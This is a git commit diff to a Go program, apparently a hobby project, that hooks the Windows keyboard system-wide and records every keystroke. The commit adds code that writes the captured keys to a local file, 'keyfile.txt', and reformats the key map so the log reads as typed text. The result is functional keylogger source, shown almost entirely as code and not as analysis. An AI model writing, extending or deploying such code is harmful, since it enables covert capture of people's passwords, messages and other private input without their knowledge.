5507722b3f1aa46099f5f49f9b7ef2ea64228261
script kiddie <anish.chittu2007@gmail.com>
2024-09-08 23:40:21 +0200

    fixed a few bugs

--- main.go
+++ main.go
@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"os"
 	"syscall"
 	"unsafe"
 
@@ -20,8 +21,8 @@ var (
 )
 
 var asciiMap = map[int]string{
-	32:  "Space",
-	8: "BSPACE",
+	32:  " ",
+	8:   " BSPACE ",
 	48:  "0",
 	49:  "1",
 	50:  "2",
@@ -32,70 +33,44 @@ var asciiMap = map[int]string{
 	55:  "7",
 	56:  "8",
 	57:  "9",
-	65:  "A",
-	66:  "B",
-	67:  "C",
-	68:  "D",
-	69:  "E",
-	70:  "F",
-	71:  "G",
-	72:  "H",
-	73:  "I",
-	74:  "J",
-	75:  "K",
-	76:  "L",
-	77:  "M",
-	78:  "N",
-	79:  "O",
-	80:  "P",
-	81:  "Q",
-	82:  "R",
-	83:  "S",
-	84:  "T",
-	85:  "U",
-	86:  "V",
-	87:  "W",
-	88:  "X",
-	89:  "Y",
-	90:  "Z",
-	97:  "a",
-	98:  "b",
-	99:  "c",
-	100: "d",
-	101: "e",
-	102: "f",
-	103: "g",
-	104: "h",
-	105: "i",
-	106: "j",
-	107: "k",
-	108: "l",
-	109: "m",
-	110: "n",
-	111: "o",
-	112: "p",
-	113: "q",
-	114: "r",
-	115: "s",
-	116: "t",
-	117: "u",
-	118: "v",
-	119: "w",
-	120: "x",
-	121: "y",
-	122: "z",
-	13: "Enter",
-	27: "ESC",
-	160: "LSHIFT",
-	161: "RSHIFT",
-	20: "Caps lock",
-	162: "LCTRL",
-	163: "RCTRL",
-    165: "PAUSE",
-    166: "SCROLL",
-    167: "HOME",
-	91: "WIN",
-	9: "TAB",
+	65:  "a",
+	66:  "b",
+	67:  "c",
+	68:  "d",
+	69:  "e",
+	70:  "f",
+	71:  "g",
+	72:  "h",
+	73:  "i",
+	74:  "j",
+	75:  "k",
+	76:  "l",
+	77:  "m",
+	78:  "n",
+	79:  "o",
+	80:  "p",
+	81:  "q",
+	82:  "r",
+	83:  "s",
+	84:  "t",
+	85:  "u",
+	86:  "v",
+	87:  "w",
+	88:  "x",
+	89:  "y",
+	90:  "z",
+	13:  "\nEnter",
+	27:  " ESC ",
+	160: " LSHIFT ",
+	161: " RSHIFT ",
+	20:  " CAPSLCK ",
+	162: " LCTRL",
+	163: " RCTRL ",
+	165: " PAUSE ",
+	166: " SCROLL ",
+	167: " HOME ",
+	91:  " WIN ",
+	9:   " TAB ",
 }
 
 type HHOOK uintptr
@@ -103,11 +78,11 @@ type WPARAM uintptr
 type LPARAM uintptr
 type LRESULT uintptr
 type KBDLLHOOKSTRUCT struct {
-	VkCode     uint32
-	ScanCode   uint32
-	Flags      uint32
-	Time       uint32
-	ExtraInfo  uintptr
+	VkCode    uint32
+	ScanCode  uint32
+	Flags     uint32
+	Time      uint32
+	ExtraInfo uintptr
 }
 
 const (
@@ -121,16 +96,19 @@ type POINT struct {
 }
 
 type MSG struct {
-	Hwnd    syscall.Handle
-	Message uint32
-	WParam  WPARAM
-	LParam  LPARAM
-	Time    uint32
-	Pt      POINT
+	Hwnd     syscall.Handle
+	Message  uint32
+	WParam   WPARAM
+	LParam   LPARAM
+	Time     uint32
+	Pt       POINT
 	LPrivate uint32
 }
 
+var file *os.File
+
 func main() {
+	file, _ = os.Create("keyfile.txt")
 	hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)
 
@@ -161,13 +139,15 @@ func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
 		if wParam == WM_KEYDOWN {
 			vkCode := kbdStruct.VkCode
-			
+
 			value, exists := asciiMap[int(vkCode)]
 			if exists {
-                fmt.Printf("Keydown: %s (0x%04X)\n", value, vkCode)
-            } else {
-                fmt.Printf("Keydown: Unknown (%d)\n", vkCode)
-            }
+				fmt.Printf("Keydown: %s (0x%04X)\n", value, vkCode)
+				file.WriteString(value)
+			} else {
+				fmt.Printf("Keydown: Unknown (%d)\n", vkCode)
+				file.WriteString(fmt.Sprint(vkCode))
+			}
 		}
 	}
 	return CallNextHookEx(hook, nCode, wParam, lParam)
